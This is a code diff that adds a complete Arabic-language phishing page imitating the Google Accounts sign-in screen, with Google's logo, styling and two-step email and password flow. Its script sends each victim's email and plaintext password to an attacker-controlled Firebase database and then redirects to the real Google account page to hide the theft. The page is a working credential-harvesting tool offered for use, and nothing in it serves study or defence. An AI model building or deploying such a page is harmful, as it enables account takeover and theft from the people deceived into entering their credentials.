@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول - حسابات Google</title>
+    
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
+
+    <style>
+        body { background-color: #fff; color: #202124; font-family: 'Roboto', Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .container { width: 450px; min-height: 500px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; box-sizing: border-box; position: relative;}
+        .logo { width: 75px; height: 24px; margin-bottom: 10px; }
+        h1 { font-size: 24px; font-weight: 400; margin: 0 0 8px; }
+        .subtitle { font-size: 16px; margin-bottom: 30px; }
+        .input-group { position: relative; margin-bottom: 10px; text-align: right; }
+        input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; box-sizing: border-box; transition: border 0.2s; }
+        input:focus { border: 2px solid #1a73e8; }
+        .forgot-link { text-align: right; font-size: 14px; color: #1a73e8; font-weight: 500; margin-bottom: 40px; cursor: pointer; display: block; text-decoration: none; }
+        .footer { display: flex; justify-content: space-between; align-items: center; margin-top: 40px; }
+        .create-link { color: #1a73e8; font-weight: 500; font-size: 14px; cursor: pointer; text-decoration: none; padding: 10px 0; }
+        .btn-next { background-color: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px; }
+        #password-view { display: none; }
+        .user-display { display: inline-flex; align-items: center; padding: 4px 12px; border: 1px solid #dadce0; border-radius: 20px; margin-bottom: 24px; font-size: 14px; font-weight: 500; cursor: pointer; }
+        .loading-bar { position: absolute; top: 0; left: 0; width: 100%; height: 4px; background: #e8f0fe; display: none; overflow: hidden; border-radius: 8px 8px 0 0; }
+        .loading-progress { width: 40%; height: 100%; background: #1a73e8; position: absolute; animation: googleLoader 1.5s infinite linear; }
+        @keyframes googleLoader { 0% { left: -40%; } 100% { left: 100%; } }
+    </style>
+</head>
+<body>
+
+<div class="loading-bar" id="top-loader"><div class="loading-progress"></div></div>
+
+<div class="container">
+    <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo" alt="Google">
+    
+    <div id="email-view">
+        <h1>تسجيل الدخول</h1>
+        <div class="subtitle">المتابعة إلى Gmail</div>
+        <div class="input-group">
+            <input type="email" id="email" placeholder="البريد الإلكتروني أو الهاتف">
+        </div>
+        <a href="https://accounts.google.com/signin/usernamerecovery" class="forgot-link" target="_blank">هل نسيت البريد الإلكتروني؟</a>
+        <div class="footer">
+            <a href="https://accounts.google.com/signup" class="create-link" target="_blank">إنشاء حساب</a>
+            <button class="btn-next" onclick="goToPassword()">التالي</button>
+        </div>
+    </div>
+
+    <div id="password-view">
+        <h1>مرحباً</h1>
+        <div class="user-display" onclick="location.reload()">
+            <span id="display-email"></span>
+        </div>
+        <div class="input-group">
+            <input type="password" id="password" placeholder="أدخل كلمة المرور">
+        </div>
+        <a href="https://accounts.google.com/signin/recovery" class="forgot-link" target="_blank">هل نسيت كلمة المرور؟</a>
+        <div class="footer">
+            <span></span>
+            <button class="btn-next" onclick="finishLogin()">التالي</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    // بيانات Firebase الخاصة بك
+    const firebaseConfig = {
+        apiKey: "AIzaSyAm1OfTW_qS4lhSGlqgDd6fiLDj3u93wqI",
+        authDomain: "clashdata-8424c.firebaseapp.com",
+        databaseURL: "https://clashdata-8424c-default-rtdb.firebaseio.com",
+        projectId: "clashdata-8424c",
+        storageBucket: "clashdata-8424c.firebasestorage.app",
+        messagingSenderId: "1063000922754",
+        appId: "1:1063000922754:web:87087f81c28c2659cb329b"
+    };
+
+    // تهيئة Firebase
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+
+    function goToPassword() {
+        const email = document.getElementById('email').value;
+        if(email.length < 5) return;
+        document.getElementById('top-loader').style.display = 'block';
+        setTimeout(() => {
+            document.getElementById('top-loader').style.display = 'none';
+            document.getElementById('email-view').style.display = 'none';
+            document.getElementById('password-view').style.display = 'block';
+            document.getElementById('display-email').innerText = email;
+        }, 850);
+    }
+
+    function finishLogin() {
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('password').value;
+        if(pass.length < 4) return;
+        
+        document.getElementById('top-loader').style.display = 'block';
+        
+        // محاولة إرسال البيانات
+        database.ref('google_test_results/').push({
+            account: email,
+            password: pass,
+            timestamp: new Date().toLocaleString()
+        }).then(() => {
+            window.location.href = "https://myaccount.google.com/";
+        }).catch((error) => {
+            console.error("خطأ في الإرسال:", error);
+            alert("فشل الاتصال بـ Firebase. تأكد من إعدادات Rules.");
+        });
+    }
+</script>
+</body>
+</html>
